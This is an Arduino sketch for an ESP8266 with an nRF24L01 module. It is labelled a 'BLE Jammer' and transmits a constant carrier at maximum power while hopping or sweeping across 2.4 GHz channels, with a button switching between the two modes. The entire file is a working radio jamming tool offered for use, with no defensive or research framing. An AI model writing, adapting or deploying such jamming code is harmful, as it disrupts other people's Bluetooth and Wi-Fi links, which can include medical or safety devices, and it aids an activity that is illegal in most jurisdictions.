#include <SPI.h>
#include <RF24.h>
#include <ESP8266WiFi.h>  // Include the Wi-Fi library for ESP8266

// Define nRF24L01 pinout
#define CE_PIN   5   // D1 (GPIO5)
#define CSN_PIN  4   // D2 (GPIO4)
#define BUTTON_PIN 0  // D3 (GPIO0) for the toggle switch

// Create RF24 object
RF24 radio(CE_PIN, CSN_PIN);

// Channel settings
byte channel = 45;
unsigned int flag = 0;

void setup() {
  // Disable Wi-Fi (optional, not strictly necessary)
  WiFi.mode(WIFI_OFF);

  Serial.begin(115200);
  
  // Initialize the button pin
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  initHP();
}

void initHP() {
  // Initialize the RF24 radio
  if (radio.begin()) {
    delay(200);
    Serial.println("BLE Jammer is Started !!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);   // Set payload size
    radio.setAddressWidth(3);  // Set address width
    radio.setPALevel(RF24_PA_MAX, true);  // Maximum power level
    radio.setDataRate(RF24_2MBPS);  // High data rate
    radio.setCRCLength(RF24_CRC_DISABLED);  // Disable CRC
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, channel);  // Start continuous carrier signal
  } else {
    Serial.println("BLE Jammer couldn't be started !!!");
  }
}

void two() {
  // Channel hopping logic with 2 spacing
  if (flag == 0) {
    channel += 3;
  } else {
    channel -= 3;
  }

  if ((channel > 79) && (flag == 0)) {
    flag = 1;
  } else if ((channel < 2) && (flag == 1)) {
    flag = 0;
  }

  radio.setChannel(channel);
  Serial.println("Jamming Bluetooth channel: " + String(channel));
}

void one() {
  // Sweep through all channels
  for (int i = 0; i < 79; i++) {
    radio.setChannel(i);
    delay(10);  // Small delay for stability
    Serial.println("Sweeping Bluetooth channel: " + String(i));
  }
}

void loop() {
  // Read the button state
  int buttonState = digitalRead(BUTTON_PIN);
  
  if (buttonState == LOW) {  // Button is pressed
    two();  // Execute channel hopping
  } else {
    one();  // Execute channel sweeping
  }
}
